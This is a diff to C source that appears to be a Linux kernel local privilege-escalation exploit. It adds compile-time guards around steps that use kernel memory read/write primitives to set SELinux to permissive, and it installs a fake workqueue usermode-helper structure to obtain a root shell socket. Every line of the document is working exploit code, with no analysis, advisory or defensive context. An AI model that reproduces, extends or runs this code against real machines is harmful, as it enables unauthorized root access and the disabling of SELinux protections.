@@ -3,6 +3,10 @@
 #include <stdlib.h>
 #include <sys/un.h>
 
+#ifndef SELINUX_ENFORCING_AVAILABLE
+#define SELINUX_ENFORCING_AVAILABLE 1
+#endif
+
 int root_child_done;
 uint32_t root_uid_before = 0xffffffff;
 uint32_t root_uid_after = 0xffffffff;
@@ -60,10 +64,12 @@ static int root_read_global(
   return configfs_read_once(fd, target, data, len) == (ssize_t)len;
 }
 
+#if SELINUX_ENFORCING_AVAILABLE
 static int root_write_global(
     int fd, uintptr_t target, const void *data, size_t len) {
   return configfs_write_once(fd, target, data, len) == (ssize_t)len;
 }
+#endif
 
 static int root_read64(
     int fd, uintptr_t target, uint64_t *value) {
@@ -188,17 +194,21 @@ static int root_hold_socket_ready(void) {
 #endif
 
 static int install_workqueue_umh_root(int fd) {
+#if SELINUX_ENFORCING_AVAILABLE
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
   uint8_t selinux_old = 0;
   uint8_t selinux_readback = 0;
+#endif
   uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
   uint8_t saved_work[sizeof(struct umh_subprocess_info)];
   uint8_t saved_data[sizeof(struct umh_kernel_data)];
   uint8_t scratch_readback[sizeof(struct umh_kernel_data)];
   int scratch_saved = 0;
+#if SELINUX_ENFORCING_AVAILABLE
   int selinux_changed = 0;
+#endif
   int inflight_changed = 0;
   int active_changed = 0;
   int refcnt_changed = 0;
@@ -272,6 +282,7 @@ static int install_workqueue_umh_root(int fd) {
              root_all_zero(saved_data, sizeof(saved_data)));
     return 0;
   }
+#if SELINUX_ENFORCING_AVAILABLE
   int selinux_read = root_read_global(
       fd, selinux_addr, &selinux_old, sizeof(selinux_old));
   if (!selinux_read) {
@@ -286,6 +297,11 @@ static int install_workqueue_umh_root(int fd) {
   pr_info("root umh spans work=%016zx-%016zx data=%016zx-%016zx selinux=%016zx old=%u\n",
           fake_work_addr, fake_work_end, umh_data_addr, umh_data_end,
           selinux_addr, selinux_old);
+#else
+  pr_info("root umh spans work=%016zx-%016zx data=%016zx-%016zx; "
+          "SELinux develop field unavailable\n",
+          fake_work_addr, fake_work_end, umh_data_addr, umh_data_end);
+#endif
 
   unlink(ROOT_SOCKET_PATH);
 
@@ -403,6 +419,7 @@ static int install_workqueue_umh_root(int fd) {
     goto cleanup;
   }
 
+#if SELINUX_ENFORCING_AVAILABLE
   if (selinux_old != permissive) {
     selinux_changed = 1;
     if (!root_write_global(fd, selinux_addr, &permissive,
@@ -415,6 +432,7 @@ static int install_workqueue_umh_root(int fd) {
       goto cleanup;
     }
   }
+#endif
 
   if (!root_read64(fd, worklist, &list_next) ||
       !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
@@ -551,6 +569,7 @@ cleanup:
     }
   }
 
+#if SELINUX_ENFORCING_AVAILABLE
   if (!result && selinux_changed && (!published || complete_done)) {
     uint8_t current = 0xff;
     int read_ok = root_read_global(fd, selinux_addr, &current,
@@ -573,6 +592,7 @@ cleanup:
     pr_info("root umh selinux left=%u intended root state old=%u\n",
             permissive, selinux_old);
   }
+#endif
 
   root_child_done = socket_ok;
   root_uid_after = socket_ok ? 0 : root_uid_before;
